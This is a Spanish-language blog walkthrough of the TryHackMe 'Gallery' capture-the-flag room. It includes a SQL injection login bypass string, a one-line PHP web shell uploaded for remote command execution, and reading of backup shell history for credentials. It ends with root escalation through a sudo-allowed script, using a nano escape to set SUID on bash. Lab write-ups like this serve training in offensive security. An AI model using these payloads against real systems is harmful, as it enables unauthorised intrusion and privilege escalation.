---
layout: single
title: Gallery - TryHackMe
excerpt: " Try to exploit our image gallery system "
date: 2023-01-31
classes: wide
header:
  teaser: /blog/assets/images/thm-writeup-gallery/gallery.png
  teaser_home_page: true
  icon: /blog/assets/images/tryhackme.webp
categories:
  - tryhackme
tags:
  - backup
  - RCE
  - bash
  - SQLI
  - sudoer
---

Try to exploit our image gallery system

# Summary
- IP: 10.10.236.224
- Ports: 80,8080
- OS: Linux (Ubuntu Bionic)
- Services & Applications:
	-  80 -> Apache httpd 2.4.29
	-  8080 -> Apache httpd 2.4.29

# Recon

- Escaneo básico de puertos:

```bash
$nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 10.10.236.224 -oG allPorts
```


- Escaneo profundo de puertos encontrados:

```bash
$nmap -p80,8080 -sCV 10.10.236.224 -oN targeted
```


# Análisis de página web:

- En el puerto 80, vemos la página por defecto de apache.

- En el puerto 8080 nos redirige a un login en el puerto 80 hacia un directorio llamado "gallery", lo analizamos con gobuster:

```bash
$gobuster dir -u http://10.10.236.224/gallery -w /usr/share/SecLists/Discovery/Web-Content/common.txt.txt -t 100
```

- Encontramos algunos directorios interesantes, sin embargo necesitaremos estar autenticados para poder hacer algo.

- Probamos bypassear con SQLI:

```
admin' or 1=1-- -
```

- Vemos que si es vulnerable a SQLI y estaremos dentro como administrador; examinamos a profundidad la página y nos damos cuenta que se trata de un CMS denominado "Simple Gallery Images", buscamos vulnerabilidades y encontramos un RCE y un SQLI, sin embargo vamos a tratar de ganar acceso al sistema de forma manual, buscando una forma de subir archivos PHP.

- Dentro de la pestaña "álbum" si hacemos click en alguno de los que están creados, vemos que podemos subir archivos, intentamos subir un PHP malicioso:

```bash
$nano cmd.php
```

```php
<?php echo passthru($_GET["cmd"]); ?>
```

- Localizamos el archivo abriendo el directorio anteriormente encontrado con gobuster "/uploads", lo abrimos y comprobamos el RCE:

```http
http://10.10.236.224/gallery/uploads/user_1/album_1/1675197900.php?cmd=whoami
```

- Entablamos una reverse shell básica y ganamos acceso al sistema como "www-data".

# ESCALANDO PRIVILEGIOS:

- Hacemos una búsqueda típica de archivos que nos puedan ayudar a escalar privilegios pero no encontramos nada, así que hacemos una búsqueda más profunda, en localizaciones poco comunes.

- Dentro del directorio "var" encontramos un directorio "backups" el cual contiene el directorio "mike_home_backup", lo cual suena bastante interesante, así que lo abrimos y lo analizamos.

- Vemos que tenemos capacidad de lectura en el archivo ".bash_history" así que lo leemos y encontramos una posible credencial para el usuario "mike".

- Accedemos como el usuario "mike" y leemos la primera flag.

- Vemos permisos de sudoers con "sudo -l" y encontramos lo siguiente:

```bash
User mike may run the following commands on gallery:
    (root) NOPASSWD: /bin/bash /opt/rootkit.sh
```

- Es decir, podemos ejecutar como root el script "rootkit.sh", así que cateamos el mismo para ver qué hace por detrás:

```bash
#!/bin/bash

read -e -p "Would you like to versioncheck, update, list or read the report ? " ans;

# Execute your choice
case $ans in
    versioncheck)
        /usr/bin/rkhunter --versioncheck ;;
    update)
        /usr/bin/rkhunter --update;;
    list)
        /usr/bin/rkhunter --list;;
    read)
        /bin/nano /root/report.txt;;
    *)
        exit;;
esac
```

- Como podemos apreciar, en una linea de el script ejecuta el binario "nano", lo cual, como ya habíamos analizado anteriormente, se ejecuta como root, esto lo podemos aprovechar haciendo una búsqueda en "gtfobins", y encontramos el siguiente comando:

```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

- Así que ejecutamos el script escrito en bash como root y elegimos la opción la cual ejecuta el binario nano para inyectar comandos, en lugar de hacer el de gtfobins, otorgaremos permisos SUID a la bash:

```bash
$sudo /bin/bash /opt/rootkit.sh
read
```

```
Ctrl+R    Ctrl+X
chmod u+s /bin/bash
```

- Ya podremos ejecutar la bash con privilegios y seremos root.

```bash
$bash -p
```
